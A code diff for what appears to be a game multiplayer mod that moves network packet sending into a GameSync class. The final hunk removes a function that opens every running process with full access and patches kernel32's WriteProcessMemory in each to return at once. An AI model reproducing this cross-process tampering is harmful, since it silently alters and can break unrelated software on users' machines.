@@ -156,14 +156,7 @@ void TakeWeapon(DWORD wepId, DWORD wepLoaded, DWORD wepHidden)
 	char buff[255];
 	sprintf(buff, "TakeWep: %i %i %i", wepId, wepLoaded, wepHidden);
 	g_CCore->GetLog()->AddLog(buff);
-	RakNet::BitStream bsOut;
-	bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-	bsOut.Write((RakNet::MessageID)LHMP_PLAYER_ADDWEAPON);
-	bsOut.Write(g_CCore->GetLocalPlayer()->GetOurID());
-	bsOut.Write(wepId);
-	bsOut.Write(wepLoaded);
-	bsOut.Write(wepHidden);
-	g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+	g_CCore->GetGameSync()->Engine_onPlayerTakeWeapon(wepId, wepLoaded, wepHidden);
 }
 _declspec(naked) void Hook_TakeWeaponFirst()
 {
@@ -235,12 +228,7 @@ void ChangeWeapon(DWORD testPed,DWORD wepId)
 		char buff[255];
 		sprintf(buff, "SwitchWep: %i", wepId);
 		g_CCore->GetLog()->AddLog(buff);
-		RakNet::BitStream bsOut;
-		bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-		bsOut.Write((RakNet::MessageID)LHMP_PLAYER_SWITCHWEAPON);
-		bsOut.Write(g_CCore->GetLocalPlayer()->GetOurID());
-		bsOut.Write(wepId);
-		g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+		g_CCore->GetGameSync()->Engine_onChangeWeapon(wepId);
 	}
 }
 _declspec(naked) void Hook_ChangeWep()
@@ -340,7 +328,6 @@ _declspec(naked) void Hook_HideWeapon()
 
 void OnShoot(DWORD testPed, float x, float y, float z)
 {
-
 	if ((g_CCore->GetLocalPlayer()->GetBase()) == testPed)
 	{
 		char buff[255];
@@ -348,16 +335,8 @@ void OnShoot(DWORD testPed, float x, float y, float z)
 		g_CCore->GetLog()->AddLog(buff);
 
 		Vector3D position = Vector3D(x, y, z);
-
-		RakNet::BitStream bsOut;
-		bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-		bsOut.Write((RakNet::MessageID)LHMP_PLAYER_SHOOT);
-		bsOut.Write(g_CCore->GetLocalPlayer()->GetOurID());
-		bsOut.Write(position);
-
-		PED* ped =(PED*) g_CCore->GetLocalPlayer()->GetBase();
-		bsOut.Write(ped->inventary.slot[0].weaponType);
-		g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+		PED* ped = (PED*)g_CCore->GetLocalPlayer()->GetBase();
+		g_CCore->GetGameSync()->Engine_onShoot(position, ped->inventary.slot[0].weaponType);
 	}
 }
 
@@ -409,11 +388,8 @@ _declspec(naked) void Hook_OnShoot()
 }
 void	OnPlayerHit(DWORD attacker)
 {
-	RakNet::BitStream bsOut;
-	bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-	bsOut.Write((RakNet::MessageID)LHMP_PLAYER_HIT);
-	bsOut.Write(g_CCore->GetPedPool()->GetPedIdByBase(attacker));
-	g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+	unsigned int ID = g_CCore->GetPedPool()->GetPedIdByBase(attacker);
+	g_CCore->GetGameSync()->Engine_onPlayerGetHit(g_CCore->GetPedPool()->Return(ID));
 }
 
 _declspec(naked) void Hook_PreventHit()
@@ -458,20 +434,14 @@ _declspec(naked) void Hook_PreventHit()
 
 void OnDeath(DWORD killerBase,unsigned char hitbox)
 {
-	int killerId = 0;
-	killerId = g_CCore->GetPedPool()->GetPedIdByBase(killerBase);
-	if (killerId != -1)
+	int playerID = 0;
+	playerID = g_CCore->GetPedPool()->GetPedIdByBase(killerBase);
+	if (playerID != -1)
 	{
 		char buff[255];
-		sprintf(buff, "Killed by 0x%i [Part %d]", killerId, hitbox);
+		sprintf(buff, "Killed by 0x%i [Part %d]", playerID, hitbox);
 		g_CCore->GetLog()->AddLog(buff);
-
-		RakNet::BitStream bsOut;
-		bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-		bsOut.Write((RakNet::MessageID)LHMP_PLAYER_DEATH);
-		bsOut.Write(killerId);
-		bsOut.Write(hitbox);
-		g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+		g_CCore->GetGameSync()->Engine_onPlayerDie(g_CCore->GetPedPool()->Return(playerID), hitbox);
 	}
 }
 
@@ -585,15 +555,10 @@ void PlayerEnteredVehicle(DWORD vehicle, DWORD seatID)
 	{
 		veh->PlayerEnter(g_CCore->GetLocalPlayer()->GetOurID(), seatID);
 		g_CCore->GetLocalPlayer()->SetIsOnFoot(0);
-		RakNet::BitStream bsOut;
-		bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-		bsOut.Write((RakNet::MessageID)LHMP_PLAYER_ENTERED_VEHICLE);
-		bsOut.Write(vehID);
-		bsOut.Write(seatID);
-		g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
-
 		sprintf(buff, "[PEV] vehicle %x, seat id: %d", vehicle, seatID);
 		g_CCore->GetLog()->AddLog(buff);
+
+		g_CCore->GetGameSync()->Engine_onPlayerEnterVehicle(veh, seatID);
 	}
 	else {
 		g_CCore->GetGame()->ConsoleAddText("You are entering an unsynced vehicle !", 0xFFFFFFFF);
@@ -671,24 +636,10 @@ void PlayerExitVehicle(DWORD vehicle)
 	{
 		veh->PlayerExit(g_CCore->GetLocalPlayer()->GetOurID());
 		g_CCore->GetLocalPlayer()->SetIsOnFoot(1);
-		RakNet::BitStream bsOut;
-		bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-		bsOut.Write((RakNet::MessageID)LHMP_PLAYER_EXIT_VEHICLE);
-		bsOut.Write(vehID);
-		g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
-
 		sprintf(buff, "[PEV] Exit vehicle %x", vehicle);
 		g_CCore->GetLog()->AddLog(buff);
+		g_CCore->GetGameSync()->Engine_onPlayerExitVehicle(veh);
 	}
-	else {
-
-	}
-	// fix
-	/*CVehicle* veh = g_CCore->GetVehiclePool()->Return(vehID);
-	if (veh != NULL)
-	{
-		g_CCore->GetGame()->CarUpdate(veh->GetEntity(),veh->GetPosition(), veh->GetRotation());
-	}*/
 }
 
 _declspec(naked) void Hook_OnPlayerExitVehicle()
@@ -787,13 +738,7 @@ void OnCarJack(int carBase, int seatId)
 	sprintf(buff, "Car jack ID: %i Seat: %i", carId, seatId);
 	g_CCore->GetLog()->AddLog(buff);
 
-	RakNet::BitStream bsOut;
-	bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-	bsOut.Write((RakNet::MessageID)LHMP_VEHICLE_JACK);
-	bsOut.Write(carId);
-	bsOut.Write(seatId);
-	g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
-
+	// TODO: move following sequence into GameSync class
 	CVehicle* veh = g_CCore->GetVehiclePool()->Return(carId);
 	if (veh != NULL)
 	{
@@ -804,7 +749,9 @@ void OnCarJack(int carBase, int seatId)
 			veh->PlayerExit(veh->GetSeat(seatId));
 			ped->SetIsOnFoot(true);
 		}
+		g_CCore->GetGameSync()->Engine_onPlayerCarjack(veh, seatId);
 	}
+	
 }
 
 _declspec(naked) void Hook_OnCarJack()
@@ -948,13 +895,9 @@ void OnThrowGranade(float x, float y, float z)
 	sprintf(buff, "Throw: %f %f %f", x, y, z);
 	g_CCore->GetLog()->AddLog(buff);
 
-	Vector3D pos;
-	pos.x = x; pos.y = y; pos.z = z;
-	RakNet::BitStream bsOut;
-	bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-	bsOut.Write((RakNet::MessageID)LHMP_PLAYER_THROWGRANADE);
-	bsOut.Write(pos);
-	g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+	Vector3D pos = Vector3D(x,y,z);
+	g_CCore->GetGameSync()->Engine_onPlayerThrowGranade(pos);
+	
 
 }
 _declspec(naked) void Hook_ThrowGranade()
@@ -1031,15 +974,8 @@ void OnDoorStateChange(DWORD doorActor, int state)
 		char buff[255];
 		sprintf(buff, "[Hook] DoorChange: %s %d %d", actorName, state, facing);
 		g_CCore->GetLog()->AddLog(buff);
-
 		g_CCore->GetLog()->AddLog(actorName);
-		RakNet::BitStream bsOut;
-		bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-		bsOut.Write((RakNet::MessageID)LHMP_DOOR_SET_STATE);
-		bsOut.Write(actorName);
-		bsOut.Write(state);
-		bsOut.Write(facing);
-		g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+		g_CCore->GetGameSync()->Engine_onDoorStateChange(actorName, state, facing);
 	}
 }
 
@@ -1417,25 +1353,19 @@ void	OnExplodeCar(DWORD carBase)
 		CVehicle* veh = g_CCore->GetVehiclePool()->Return(ID);
 		if (veh != NULL)
 		{
-			//if (veh->GetPlayerSeat(0) == g_CCore->GetLocalPlayer()->GetOurID())
-			//{
 				char buff[100];
 				sprintf(buff, "CarExplodedEvent: %p", carBase);
 				g_CCore->GetLog()->AddLog(buff);
 
+				// TODO: add here some documentation - WTF is this engine function good for ?
+				// does it blow up a car ? 
 				_asm {
 					PUSH 0
 					MOV ECX, carBase
 					MOV EAX, 0x00468BC0
 					CALL EAX; 0x00468BC0
 				}
-
-				RakNet::BitStream bsOut;
-				bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-				bsOut.Write((RakNet::MessageID)LHMP_VEHICLE_ON_EXPLODED);
-				bsOut.Write(ID);
-				g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
-			//}
+				g_CCore->GetGameSync()->Engine_onExplodeCar(veh);
 		}
 	}
 }
@@ -1801,13 +1731,8 @@ _declspec (naked) void Hook_OnChangePlayerCarRotation()
 
 void RestInPeace()
 {
-	//g_CCore->GetChat()->AddMessage("TESTIQ - OK ROMCO");
-
 	// Send info to server
-	RakNet::BitStream bsOut;
-	bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-	bsOut.Write((RakNet::MessageID)LHMP_PLAYER_DEATH_END);
-	g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+	g_CCore->GetGameSync()->Engine_onMapRespawn();
 }
 
 _declspec (naked) void Hook_RestInPeace()
@@ -1883,15 +1808,8 @@ void OnPlayerVehicleEngineStateChange(DWORD vehicle, BYTE state)
 			// if localPlayer == driver of that vehicle
 			if (playerid == g_CCore->GetLocalPlayer()->GetOurID())
 			{
-				veh->ToggleEngine(state);
-
 				//Send data 
-				RakNet::BitStream bsOut;
-				bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-				bsOut.Write((RakNet::MessageID)LHMP_VEHICLE_TOGGLE_ENGINE);
-				bsOut.Write(vehID);
-				bsOut.Write(state);
-				g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+				g_CCore->GetGameSync()->Engine_onVehicleEngineStateChange(veh,state);
 			}
 		}
 
@@ -2027,12 +1945,7 @@ void Hook_Car_ProcessEngineStateChange(DWORD car, DWORD shouldStartOrSwitchOff)
 			// if it's streamed, then allow the changes & call engine function
 			g_CCore->GetGame()->SetCarEngineState(car, (shouldStartOrSwitchOff == 1));
 			// network sync
-			RakNet::BitStream bsOut;
-			bsOut.Write((RakNet::MessageID)ID_GAME_LHMP_PACKET);
-			bsOut.Write((RakNet::MessageID)LHMP_VEHICLE_TOGGLE_ENGINE);
-			bsOut.Write(g_CCore->GetLocalPlayer()->IDinCar);
-			bsOut.Write((bool)(shouldStartOrSwitchOff > 0));
-			g_CCore->GetNetwork()->SendServerMessage(&bsOut, IMMEDIATE_PRIORITY, RELIABLE_ORDERED);
+			g_CCore->GetGameSync()->Engine_onVehicleEngineStateChange(veh, (bool)(shouldStartOrSwitchOff > 0));
 		}
 		else if (veh->GetEngineState() == shouldStartOrSwitchOff)
 		{
@@ -2202,10 +2115,6 @@ void SetHooks()
 	Tools::Nop(0x005E0E49, 17);
 	Tools::InstallCallHook(0x005E0E49, (DWORD)&Hook_respawn);
 	// Respawn
-	/*VirtualProtect((void*)0x005F97ED, 5, PAGE_EXECUTE_READWRITE, &lpflOldProtect);
-	*(BYTE*)(0x005F97ED) = 0xE9;
-	*(DWORD*)(0x005F97EE) = (unsigned long)&Respawn - 0x005F97F2;
-	VirtualProtect((void*)0x005F97ED, 5, lpflOldProtect, &lpflOldProtect);*/
 
 	// used for Afterrespawn
 	Tools::InstallJmpHook(0x00558D74, (DWORD)&AfterRespawn);
@@ -2275,14 +2184,7 @@ void SetHooks()
 	Tools::InstallJmpHook(0x004A3FA6, (DWORD)&Hook_ThrowGranade);
 	Tools::InstallJmpHook(0x004CC608, (DWORD)&Hook_OnDoorStateChange);
 
-	
-	/*Tools::InstallJmpHook(0x005AF863, (DWORD)&Hook_OnScriptLoad);
-	Tools::InstallJmpHook(0x005AF86F, (DWORD)&OnScriptDeload);	// fix for some Win7 PCs (e.g. Robville one)
-	*/
-	//Tools::InstallJmpHook(0x005AF863, (DWORD)&Hook_OnScriptLoadFinal);
-
 	Tools::InstallJmpHook(0x005F93C4, (DWORD)&Hook_Respawn01);	
-
 
 	Tools::InstallJmpHook(0x0046B7E7, (DWORD)&Hook_CarMolotovDamage);
 	Tools::InstallJmpHook(0x0046B7FA, (DWORD)&Hook_CarMolotovDamagePart2);
@@ -2299,78 +2201,4 @@ void SetHooks()
 	Tools::InstallCallHook(0x005A0FEE, (DWORD)&Hook_ExplodeCar);
 	Tools::InstallCallHook(0x005C10AC, (DWORD)&Hook_ExplodeCar);
 		
-}
-
-void CheckProccesses()
-{
-	// Get the list of process identifiers.
-	//002B0E59   83C4 14          ADD ESP, 14
-	//002B0E5C   C3               RETN
-
-
-	//BYTE data[] = "0x83,0xC4,0x14,0xC3";
-	//75776419 > C2 1400          RETN 14
-
-
-	BYTE data[] = "\xC2\x14\x00";
-	DWORD aProcesses[1024], cbNeeded, cProcesses;
-	DWORD oldprot, dummy = 0;
-	LPVOID procMem = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory");
-	unsigned int i;
-
-	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
-	{
-		return;
-	}
-
-
-	// Calculate how many process identifiers were returned.
-
-	cProcesses = cbNeeded / sizeof(DWORD);
-
-	// Print the name and process identifier for each process.
-
-	for (i = 0; i < cProcesses; i++)
-	{
-		if (aProcesses[i] != 0)
-		{
-			if (GetCurrentProcessId() != aProcesses[i])
-			{
-				//PROCESS_ALL_ACCESS
-				/*HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
-					PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
-					FALSE, aProcesses[i]);*/
-				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,
-					FALSE, aProcesses[i]);
-				if (hProcess != NULL)
-				{
-
-					char buff[50];
-					TCHAR Buffer[MAX_PATH];
-					if (GetModuleFileNameEx(hProcess, 0, Buffer, MAX_PATH))
-					{
-						Tools::GetProcessNameFromPath(Buffer, buff, 50);
-						//g_CCore->GetChat()->AddMessage(buff);
-						if (strcmp(buff, "chrome.exe") == 0)
-							continue;
-					}
-					VirtualProtectEx(hProcess, (LPVOID)procMem, sizeof(data), PAGE_READWRITE, &oldprot);
-					if (WriteProcessMemory(hProcess, (LPVOID)procMem, &data, sizeof(data), NULL) == NULL)
-					{
-						//g_CCore->GetChat()->AddMessage("WPM fault");
-
-						//g_CCore->GetChat()->AddMessage(buff);
-					}
-					else
-					{
-						//g_CCore->GetChat()->AddMessage("done");
-					}
-
-					VirtualProtectEx(hProcess, (LPVOID)procMem, sizeof(data), oldprot, &dummy);
-				}
-			}
-		}
-	}
-
-	return;
 }
